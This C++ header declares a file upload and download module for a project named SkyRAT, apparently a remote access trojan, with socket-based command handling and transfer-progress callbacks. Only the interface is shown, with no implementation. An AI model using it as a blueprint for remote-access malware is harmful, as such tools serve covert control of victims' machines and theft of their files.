#pragma once

#include "../Imodule.h"
#include "../../Utils/Logger.h"
#include <windows.h>
#include <string>
#include <memory>
#include <atomic>
#include <thread>
#include <functional>
#include <fstream>
#include <mutex>

namespace SkyRAT {
namespace Modules {
namespace Implementations {

/**
 * @brief Module for cross-platform file data transfer (Upload/Download via sockets).
 */
class DataTransferModule : public IModule {
public:
    DataTransferModule();
    virtual ~DataTransferModule();

    // IModule interface
    std::string getName() const override;
    std::string getVersion() const override;
    bool initialize() override;
    void shutdown() override;
    bool isRunning() const override;
    bool start(SOCKET socket) override;         // Start as client
    bool stop() override;
    bool processCommand(const std::string& command, SOCKET socket) override;
    std::string getStatus() const override;
    bool canHandleCommand(const std::string& command) const override;
    bool executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) override;
    std::vector<std::string> getSupportedCommands() const override;

    // High-level APIs (for upload/download)
    bool uploadFile(const std::string& localPath, const std::string& remoteName = "");
    bool downloadFile(const std::string& remoteName, const std::string& localPath = "");
    void setProgressCallback(std::function<void(int, long long, long long)> callback);

private:
    // State
    std::atomic<bool> m_isRunning;
    std::atomic<bool> m_shouldStop;
    std::atomic<bool> m_isTransferring;
    std::shared_ptr<Utils::Logger> m_logger;
    std::unique_ptr<std::thread> m_transferThread;
    SOCKET m_socket;
    std::mutex m_callbackMutex;
    std::function<void(int, long long, long long)> m_progressCallback;

    std::string m_transferStatus;
    std::string m_lastError;
    std::string m_logFileName;

    // Internal helpers
    void transferThreadFunction();
    bool sendAll(const char* data, size_t length);
    bool recvAll(char* buffer, size_t length);

    // Utility
    std::string sanitizeFileName(const std::string& fileName);
    void notifyProgress(int percent, long long transferred, long long total);
};

} // namespace Implementations
} // namespace Modules
} // namespace SkyRAT
